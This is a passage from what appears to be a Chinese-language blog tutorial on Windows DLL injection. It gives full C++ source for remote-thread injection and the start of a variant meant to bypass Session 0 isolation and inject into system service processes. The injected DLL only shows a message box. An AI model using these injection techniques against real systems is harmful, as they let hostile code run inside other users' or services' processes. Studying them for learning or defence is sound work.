class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;success!&quot;</span>, <span class="string">L&quot;RemoteThreadInjection&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;success!&quot;</span>, <span class="string">L&quot;RemoteThreadInjection&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接生成dll</p><h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>核心函数在于远程线程注入<code>_RemoteThreadInjection</code>中：</p><ul><li>函数原型设计：我们需要得知远程线程注入的目标进程PID以及执行线程的对应DLL文件位置（采用宽字符串）</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD _RemoteThreadInjection(DWORD _Pid, LPCWSTR DllName)</span><br></pre></td></tr></table></figure><ul><li>OpenProcess打开进程获得句柄</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hprocess = ::<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, _Pid);</span><br><span class="line"><span class="comment">// 异常检查</span></span><br><span class="line"><span class="keyword">if</span> (hprocess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>VirtualAllocEx API申请内存，该内存存储</li></ul><p><code>_tcslen(DllName)</code>截取的宽字符串长度不包括字符串终止符，所以需要加1，并乘上宽字符的大小以计算出字节数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在注入的进程中申请内存</span></span><br><span class="line">_Size = (_tcslen(DllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">pDllAddr = ::<span class="built_in">VirtualAllocEx</span>(hprocess,<span class="literal">NULL</span>,_Size,</span><br><span class="line">    MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">// 第二个参数表示分配页面所需起始地址的指针</span></span><br><span class="line">    <span class="comment">// 第四个参数是指内存分配类型，MEM_COMMIT表示在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</span></span><br><span class="line">    <span class="comment">// 第五个参数表示要分配的页面区域的内存保护，如果yem</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process Memory Allocation Error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>申请完之后就是使用WriteProcessMemory写数据</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hprocess, pDllAddr, DllName, _Size, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><ul><li>获取LoadLibraryW的地址</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pThread = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>),<span class="string">&quot;LoadLibraryW&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>创建线程，并传入参数</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hThread = ::<span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><ul><li>释放资源等操作</li></ul><p>完整源码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 远程线程注入</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span><span class="comment">// 宽字符</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> DLL_PATH[] = <span class="string">&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// LPCWSTR: long pointer to a wide string </span></span><br><span class="line">DWORD _RemoteThreadInjection(DWORD _Pid, LPCWSTR DllName) &#123;</span><br><span class="line"><span class="comment">// 变量声明</span></span><br><span class="line">HANDLE hprocess;<span class="comment">// 目标进程的句柄</span></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD _Size = <span class="number">0</span>;</span><br><span class="line">BOOL Write = <span class="number">0</span>;</span><br><span class="line">LPVOID pDllAddr = <span class="literal">NULL</span>;<span class="comment">// 申请内存空间</span></span><br><span class="line">DWORD DllAddr = <span class="number">0</span>;</span><br><span class="line">FARPROC pThread;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">hprocess = ::<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, _Pid);</span><br><span class="line"><span class="comment">// 异常检查</span></span><br><span class="line"><span class="keyword">if</span> (hprocess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在注入的进程中申请内存</span></span><br><span class="line">_Size = (_tcslen(DllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">pDllAddr = ::<span class="built_in">VirtualAllocEx</span>(hprocess,<span class="literal">NULL</span>,_Size,</span><br><span class="line">MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="comment">// 第二个参数表示分配页面所需起始地址的指针</span></span><br><span class="line"><span class="comment">// 第四个参数是指内存分配类型，MEM_COMMIT表示在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</span></span><br><span class="line"><span class="comment">// 第五个参数表示要分配的页面区域的内存保护，如果yem</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Process Memory Allocation Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 向申请的内存写入数据</span></span><br><span class="line">BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hprocess, pDllAddr, DllName, _Size, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (isWriteSuccess == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Write Process Memory Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取LoadLibraryW(支持宽字符)函数地址</span></span><br><span class="line">pThread = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)pThread;</span><br><span class="line"><span class="comment">// LPTHREAD_START_ROUTINE 是一个函数指针类型，用于指定线程的入口点函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在目标进程中创建线程</span></span><br><span class="line">hThread = ::<span class="built_in">CreateRemoteThread</span>(hprocess, <span class="literal">NULL</span>, <span class="number">0</span>, addr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// hprocess指向了目标进程</span></span><br><span class="line"><span class="comment">// addr表示LoadLibrary的LPTHREAD_START_ROUTINE函数指针</span></span><br><span class="line"><span class="comment">// pDllAddr表示传递给线程函数的变量的对应的指针（传给LoadLibrary的变量）</span></span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create Remote Thread Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待线程函数结束，获得退出码</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">GetExitCodeThread</span>(hThread, &amp;DllAddr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放DLL空间</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hprocess, pDllAddr, _Size, MEM_DECOMMIT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭句柄</span></span><br><span class="line">::<span class="built_in">CloseHandle</span>(hprocess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DWORD _PID = <span class="number">1220</span>;<span class="comment">// 根据实际进程的PID填入</span></span><br><span class="line">_RemoteThreadInjection(_PID, <span class="string">L&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注入之前：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291541808.png" alt="image-20240129154125529"></p><p>注入之后：可以观察到其实不止多了DLLInjection.dll文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291542782.png" alt="image-20240129154201976"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291542597.png" alt="image-20240129154215615"></p><h2 id="突破SESSION-0-隔离的远线程注入"><a href="#突破SESSION-0-隔离的远线程注入" class="headerlink" title="突破SESSION 0 隔离的远线程注入"></a>突破SESSION 0 隔离的远线程注入</h2><p>在远程线程注入中，将目标进程改为一些系统服务进程时会发现失败，这是由于存在SESSION 0隔离的安全机制，传统的远程线程注入并不能突破SESSION 0隔离</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291548406.png" alt="image-20240129154717719"></p><h3 id="Session-0隔离机制"><a href="#Session-0隔离机制" class="headerlink" title="Session 0隔离机制"></a>Session 0隔离机制</h3><p>参考：<a href="https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361?ranMID=46131&ranEAID=a1LgFw09t88&ranSiteID=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&epi=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&irgwc=1&OCID=AIDcmm549zy227_aff_7806_1243925&tduid=(ir__9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00)(7806)(1243925)(a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew)()&irclickid=_9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00">https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&amp;epi=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&amp;irgwc=1&amp;OCID=AIDcmm549zy227_aff_7806_1243925&amp;tduid=(ir__9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00)(7806)(1243925)(a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew)()&amp;irclickid=_9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00</a></p><p>在早期Windows版本中（WinXP，WinServer2003以及之前），所有服务都与登录到控制台的第一个用户（超级管理员）处于同一个会话中，该会话即所谓的Session 0，此时其他非系统服务等同于拥有超级管理员权限来执行，那么此时遭遇劫持就直接最高权限了。</p><p>此后在Windows内核6.0版本后引入了Session 0隔离机制，只有系统进程和服务才会处于session 0中运行，用户登录到会话1，后续用户登录到2,3 …</p><p>Session 0隔离机制使得当创建一个进程后不立即执行，而是先挂起进程，在查看运行的进程所在的会话层之后再决定是否恢复进程运行。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291617173.gif;charset=UTF-8"></p><h3 id="WinAPI介绍-2"><a href="#WinAPI介绍-2" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><p>原理与远程线程注入的原理大致相同，但是使用的WinAPI是比CreateRemoteThread更为底层的ZwCreateThreadEx函数来创建线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// win64</span></span><br><span class="line">DWORD WINAPI ZwCreateThreadEx&#123;</span><br><span class="line">    PHANDLE ThreadHandle,</span><br><span class="line">    ACCESS_MASK DesiredAccess,</span><br><span class="line">    LPVOID ObjectAttributes,</span><br><span class="line">    HANDLE ProcessHandle,</span><br><span class="line">    LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">    LPVOID lpParameter,</span><br><span class="line">    ULONG CreateThreadFlags,</span><br><span class="line">    SIZE_T ZeroBits,</span><br><span class="line">    SIZE_T StackSize,</span><br><span class="line">    SIZE_T MaximumStackSize,</span><br><span class="line">    LPVOID pUnkown</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win32</span></span><br><span class="line">DWORD WINAPI ZwCreateThreadEx&#123;</span><br><span class="line"> PHANDLE ThreadHandle,</span><br><span class="line">    ACCESS_MASK DesiredAccess,</span><br><span class="line">    LPVOID ObjectAttributes,</span><br><span class="line">    HANDLE ProcessHandle,</span><br><span class="line">    LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">    LPVOID lpParameter,</span><br><span class="line">    BOOL CreateSuspended,</span><br><span class="line">    DWORD dwStackSize,</span><br><span class="line">    DWORD dw1,</span><br><span class="line">    DWORD dw2,</span><br><span class="line">    LPVOID pUnknown</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="操作过程-2"><a href="#操作过程-2" class="headerlink" title="操作过程"></a>操作过程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 突破session 0隔离机制注入DLL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#include &quot;tchar.h&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用typedef对ZwCreateThreadEx创建函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">BOOL flag = FALSE;</span><br><span class="line"><span class="comment">// OpenProcessToken 打开与进程关联的token</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">&#123;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> valueGetLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"></span><br><span class="line">flag = (valueGetLastError == ERROR_SUCCESS);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">BypassSession0Injection</span><span class="params">(DWORD _PID, <span class="type">const</span> <span class="type">char</span>* DLLPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 变量声明</span></span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    LPVOID pDllAddr = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC LoadLibraryA_Addr = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hRemoteThread = <span class="literal">NULL</span>;        <span class="comment">// 远程线程</span></span><br><span class="line">    DWORD dwStatus = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 提权 -- 启用SeDebugPrivilege权限</span></span><br><span class="line">    <span class="comment">//BOOL isPrivieged = EnableDebugPrivilege();</span></span><br><span class="line">    <span class="comment">//if (isPrivieged == FALSE) &#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;Can&#x27;t get SeDebugPrivilege!\n&quot;);</span></span><br><span class="line">    <span class="comment">//    return FALSE;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 由于具有SeDebugPrivilege，所以可以对系统服务设置为PROCESS_ALL_ACCESS</span></span><br><span class="line">    hProcess = ::<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, _PID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Open Process Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请内存</span></span><br><span class="line">        <span class="comment">// 申请内存的大小</span></span><br><span class="line">    dwSize = ::<span class="built_in">strlen</span>(DLLPath) + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// ::lstrlen    对于宽字符串</span></span><br><span class="line">            <span class="comment">// ::strlen    对于字符串</span></span><br><span class="line">        <span class="comment">// 申请，返回基地址</span></span><br><span class="line">    pDllAddr = ::<span class="built_in">VirtualAllocEx</span>(hProcess, <span 